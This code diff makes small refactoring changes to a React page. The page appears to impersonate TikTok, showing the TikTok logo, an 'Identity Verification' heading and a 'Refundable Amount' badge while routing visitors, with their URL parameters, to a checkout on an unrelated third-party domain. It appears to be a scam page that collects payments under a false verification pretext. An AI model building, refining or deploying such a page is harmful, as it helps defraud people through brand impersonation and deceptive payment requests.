@@ -1,14 +1,10 @@
-import { useEffect, useRef } from "react";
 import { useSearchParams } from "react-router-dom";
-import tiktokLogo from "@/assets/tiktok-logo.png";
 
 const CHECKOUT_BASE_URL = "https://checkout.cooud.com/01KH52NHC02W9XP6SGHQ1DAMXK";
-
 const TOP_CROP = 270;
 
 const Index = () => {
   const [searchParams] = useSearchParams();
-  const containerRef = useRef<HTMLDivElement>(null);
 
   const checkoutUrl = (() => {
     const params = searchParams.toString();
@@ -17,7 +13,6 @@ const Index = () => {
 
   return (
     <div
-      ref={containerRef}
       style={{
         width: "100%",
         minHeight: "100vh",
@@ -41,7 +36,7 @@ const Index = () => {
         }}
       >
         <img
-          src={tiktokLogo}
+          src="/tiktok-logo.png"
           alt="TikTok"
           style={{
             height: "32px",
@@ -65,7 +60,7 @@ const Index = () => {
               fontWeight: 600,
               letterSpacing: "0.08em",
               color: "#6b7280",
-              textTransform: "uppercase" as const,
+              textTransform: "uppercase",
             }}
           >
             Identity Verification
@@ -97,7 +92,7 @@ const Index = () => {
                 backgroundColor: "#ecfdf5",
                 padding: "4px 10px",
                 borderRadius: "20px",
-                textTransform: "uppercase" as const,
+                textTransform: "uppercase",
               }}
             >
               Refundable Amount
